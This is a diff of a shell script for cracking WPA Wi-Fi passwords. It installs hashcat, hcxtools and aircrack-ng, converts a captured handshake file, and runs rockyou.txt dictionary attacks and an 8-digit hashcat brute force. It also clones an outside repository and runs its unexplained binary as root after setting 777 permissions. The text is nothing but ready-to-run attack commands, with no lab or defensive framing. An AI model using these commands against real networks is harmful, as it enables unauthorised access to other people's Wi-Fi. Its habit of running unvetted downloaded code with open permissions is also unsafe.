@@ -3,12 +3,12 @@
  apt install hashcat hcxtools git -y
 git clone https://github.com/raushan102189/clo.git
 cd clo
-hcxpcapngtool  wpa_handshake-12.cap -o test.22000
+hcxpcapngtool  abc-01.cap -o test.22000
 chmod +777 *
 
 gunzip rockyou.txt.tar.gz
 tar -xf rockyou.txt.tar 
-hashcat -m 22000 -w 4 -d 1  test.22000  rockyou.txt
+
 git clone https://github.com/danielmiessler/SecLists.git 
 cp test.22000  all.py SecLists/Passwords/Leaked-Databases
 cd SecLists/Passwords/Leaked-Databases
@@ -16,4 +16,10 @@ cd SecLists/Passwords/Leaked-Databases
  chmod +777 all
  ./all
 
- 
+ sudo su
+apt update
+apt install aircrack-ng -y
+gunzip rockyou.txt.tar.gz
+tar -xf rockyou.txt.tar 
+aircrack-ng abc-01.cap -w rockyou.txt
+hashcat  -a 3 -m 22000 -w 4 -d 1  test.22000  ?d?d?d?d?d?d?d?d
